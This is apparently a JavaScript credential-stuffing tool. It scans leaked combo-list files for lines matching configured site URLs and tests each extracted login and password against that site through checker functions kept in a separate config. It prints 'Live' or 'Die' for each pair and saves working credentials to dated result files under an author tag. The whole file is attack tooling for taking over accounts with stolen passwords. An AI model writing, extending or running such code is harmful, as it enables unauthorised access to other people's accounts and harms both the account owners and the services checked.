import {
  existsSync,
  mkdirSync,
  readdirSync,
  writeFileSync,
  createReadStream,
  appendFileSync,
} from "fs";
import configs from "./core/configs.js";


const [blue, yellow, green, red, resetColor] = [
  "\x1b[34m",
  "\x1b[33m",
  "\x1b[32m",
  "\x1b[31m",
  "\x1b[0m",
];

const pathDb = "./db";
const resultsPath = './results'
const date = new Date();
const infoDate = `${date.getDay()}.${date.getMonth()}.${date.getFullYear()} [ ${date.getHours()}h ]`



const by = '_duduslx7'

async function checkerAndShowResult(chk, login, pass, checkerName) {
  try {
    
    const {success, uri} = await chk(login, pass);
    console.log(
      `${success ? green : red}[ ${
        success ? "Live" : "Die"
      } ] - [${checkerName}] ( ${login}:${pass} ) ${success ? `-> ${uri}` : ''}-> @${by}${resetColor}`
    );

      if (!success) return
      if (!existsSync(resultsPath)) mkdirSync(resultsPath)
      if (!existsSync(`${resultsPath}/${infoDate}`)) mkdirSync(`${resultsPath}/${infoDate}`)
      appendFileSync(`${resultsPath}/${infoDate}/${checkerName}.txt`, `${login}:${pass}\n`)

  } catch (error) {
    console.log('error in ', checkerName);
    console.log(error);
    
    
  }
}

export default async function SearchStrInDbAndChecker() {
  console.clear();
  

  const filesInDirectory = readdirSync(pathDb);

  if (filesInDirectory.length == 0) return console.log("no files in directory");

  console.log(`searching in the ${filesInDirectory.length} files ...`);

  for (const file of filesInDirectory) {
    console.log('runnig', configs.checkers.length , 'checkers');
    
    await new Promise((resolve) => {
      const contentFile = createReadStream(`${pathDb}/${file}`, "utf-8");

      contentFile.on("data", async (chunk) => {
        const lines = chunk.split("\n");

        for (const line of lines) {
          for (const {online, name, url, checker } of configs.checkers) {

            if(!online) continue

            if (line.includes(url)) {

              const splitLogin = line.split(":");

              let [login, pass] =
                splitLogin.length === 3
                  ? [splitLogin[1], splitLogin[2]]
                  : [splitLogin[2], splitLogin[3]];

              if (!login || !pass) continue;

              if (login.includes('http')) {
                //as vezes o login pode vim trocado 
                login = splitLogin[0]
                pass = splitLogin[1]
              }
              
              await checkerAndShowResult(
                checker,
                login.trim(),
                pass.trim(),
                name
              );
            }
          }
        }
      });

      contentFile.on("end", resolve);
    });
  }
  console.log(`results save in ${resultsPath}/${infoDate}`);
  
}
